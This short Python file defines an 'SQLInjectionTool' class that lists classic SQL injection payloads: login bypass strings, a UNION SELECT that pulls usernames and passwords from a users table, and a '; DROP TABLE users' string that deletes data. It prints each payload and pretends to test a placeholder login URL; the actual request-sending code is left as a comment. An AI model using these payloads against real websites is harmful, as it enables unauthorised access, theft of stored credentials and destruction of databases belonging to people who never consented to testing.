import string

class SQLInjectionTool:
    def __init__(self):
        self.payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL, username, password FROM users --",
            "' OR 'a' = 'a' --",
            "' AND 1=2 --",
            "'; DROP TABLE users --"
        ]

    def generate_payload(self):
        print("SQL Injection Payloads:")
        for payload in self.payloads:
            print(payload)

    def test_sql_injection(self, url, payload):
        # Simulate the URL testing with SQL Injection payload
        print(f"Testing {url} with payload: {payload}")
        # Add actual testing logic here using requests or other libraries for HTTP requests.

if __name__ == "__main__":
    sql_tool = SQLInjectionTool()
    sql_tool.generate_payload()

    # Example: Test a URL
    test_url = "http://target-website.com/login"
    sql_tool.test_sql_injection(test_url, sql_tool.payloads[0])
